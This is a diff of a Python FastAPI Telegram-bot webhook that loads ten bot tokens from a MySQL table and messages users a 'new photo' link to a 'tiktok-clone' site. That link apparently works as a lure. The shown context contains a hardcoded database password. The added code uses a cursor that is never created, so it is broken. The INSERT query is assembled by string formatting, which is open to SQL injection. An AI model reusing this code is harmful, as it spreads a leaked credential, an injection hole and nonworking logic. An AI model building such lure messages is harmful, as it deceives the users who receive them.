@@ -20,6 +20,33 @@ db_password = "PUQC7sa$"
 db_name = "default_db"
 
 
+mydb = mysql.connector.connect(
+    host=db_host,
+    user=db_user,
+    password=db_password,
+    database=db_name,
+)
+
+mycursor.execute("SELECT * FROM kwork22_rezerv")
+all_rezerv = mycursor.fetchall()
+
+                
+mycursor.close()
+mydb.close()
+
+token_1 = all_rezerv[0][0]
+token_2 = all_rezerv[1][0]
+token_3 = all_rezerv[2][0]
+token_4 = all_rezerv[3][0]
+token_5 = all_rezerv[4][0]
+token_6 = all_rezerv[5][0]
+token_7 = all_rezerv[6][0]
+token_8 = all_rezerv[7][0]
+token_9 = all_rezerv[8][0]
+token_10 = all_rezerv[9][0]
+
+all_token = [token_1, token_2, token_3, token_4, token_5, token_6, token_7, token_8, token_9, token_10]
+bot = Bot(token_1)
 
 app = FastAPI()
 
@@ -64,22 +91,6 @@ async def webhook(
         subscription = mycursor.fetchone()
         subscription = int(subscription[0])
 
-        mycursor.execute("SELECT * FROM kwork22_rezerv")
-        all_rezerv = mycursor.fetchall()
-
-        token_1 = all_rezerv[0][0]
-        token_2 = all_rezerv[1][0]
-        token_3 = all_rezerv[2][0]
-        token_4 = all_rezerv[3][0]
-        token_5 = all_rezerv[4][0]
-        token_6 = all_rezerv[5][0]
-        token_7 = all_rezerv[6][0]
-        token_8 = all_rezerv[7][0]
-        token_9 = all_rezerv[8][0]
-        token_10 = all_rezerv[9][0]
-
-        all_token = [token_1, token_2, token_3, token_4, token_5, token_6, token_7, token_8, token_9, token_10]
-        bot = Bot(token_1)
         if subscription > 0:
 
         
@@ -99,7 +110,7 @@ async def webhook(
 
 
 
-            message = await send_telegram_message(user_id=user_id, text=f"🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}", reply_markup=keyboard, bot=bot)
+            message = await send_telegram_message(user_id=user_id, text=f"🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}", reply_markup=keyboard)
 
          
             mycursor.execute("INSERT INTO kwork22_photo (url, photo_time, user_id, message_id, token)  VALUES ('{}', '{}', '{}', '{}', '{}')".format(photo_path, int(time.time()), int(user_id), message.message_id, str(token_1) ))
@@ -111,12 +122,12 @@ async def webhook(
     return {"status": "Success"}
 
 
-async def send_telegram_message(user_id, text, reply_markup, bot):
+async def send_telegram_message(user_id, text, reply_markup):
     message = await bot.send_message(user_id, text, reply_markup=reply_markup, disable_web_page_preview=True)
     return message
 
 
-async def send_telegram_photo(user_id, photo, redirect_url, bot):
+async def send_telegram_photo(user_id, photo, redirect_url):
     photo_path = await save_image(photo, "data/images")
     message = await bot.send_photo(user_id, FSInputFile(photo_path), caption=f'🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}')
 
@@ -137,6 +148,9 @@ async def connect():
         database=db_name,
     )
     return mydb
+
+
+
         
 async def save_image(image: UploadFile, directory: str) -> str:
     if image.filename.split(".")[-1].lower() not in ['jpeg', 'png', 'jpg', 'gif']:
